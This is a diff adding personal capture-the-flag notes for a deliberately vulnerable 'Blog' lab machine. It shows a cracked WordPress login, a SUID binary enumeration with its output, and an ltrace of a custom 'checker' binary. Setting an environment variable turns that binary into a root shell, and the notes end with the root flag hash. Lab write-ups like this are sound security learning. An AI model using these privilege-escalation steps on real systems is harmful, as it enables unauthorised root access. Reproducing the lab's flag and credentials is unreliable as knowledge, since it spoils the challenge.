@@ -104,3 +104,82 @@ wpscan with `--enumerate u`
 ```
 
 kwheel:cutiepie1
+
+foohold with metasploit
+
+privesc
+```
+find / -perm -u=s -type f 2>/dev/null
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/chsh
+/usr/bin/newuidmap
+/usr/bin/pkexec
+/usr/bin/chfn
+/usr/bin/sudo
+/usr/bin/at
+/usr/bin/newgidmap
+/usr/bin/traceroute6.iputils
+/usr/sbin/checker
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/snapd/snap-confine
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/bin/mount
+/bin/fusermount
+/bin/umount
+/bin/ping
+/bin/su
+/snap/core/8268/bin/mount
+/snap/core/8268/bin/ping
+/snap/core/8268/bin/ping6
+/snap/core/8268/bin/su
+/snap/core/8268/bin/umount
+/snap/core/8268/usr/bin/chfn
+/snap/core/8268/usr/bin/chsh
+/snap/core/8268/usr/bin/gpasswd
+/snap/core/8268/usr/bin/newgrp
+/snap/core/8268/usr/bin/passwd
+/snap/core/8268/usr/bin/sudo
+/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/8268/usr/lib/openssh/ssh-keysign
+/snap/core/8268/usr/lib/snapd/snap-confine
+/snap/core/8268/usr/sbin/pppd
+/snap/core/9066/bin/mount
+/snap/core/9066/bin/ping
+/snap/core/9066/bin/ping6
+/snap/core/9066/bin/su
+/snap/core/9066/bin/umount
+/snap/core/9066/usr/bin/chfn
+/snap/core/9066/usr/bin/chsh
+/snap/core/9066/usr/bin/gpasswd
+/snap/core/9066/usr/bin/newgrp
+/snap/core/9066/usr/bin/passwd
+/snap/core/9066/usr/bin/sudo
+/snap/core/9066/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/9066/usr/lib/openssh/ssh-keysign
+/snap/core/9066/usr/lib/snapd/snap-confine
+/snap/core/9066/usr/sbin/pppd
+
+```
+
+needed walkthrough. I found "checker" in /usr/sbin and had no idea what it did. I ran `strings` on it but nothin interesting going on there. A walkthrough (https://www.jaacostan.com/2020/10/thm-walkthrough-blog.html) tried `ltrace` and that resulted in.
+```
+ltrace ./checker
+getenv("admin")                                  = nil
+puts("Not an Admin")                             = 13
+Not an Admin
++++ exited (status 0) +++
+```
+
+NICE!!! This is easy from here. `export admin=true` 
+```
+./checker
+whoami
+root
+cat /root/root.txt
+9a0b2b618bef9bfa7ac28c1353d9f318
+```
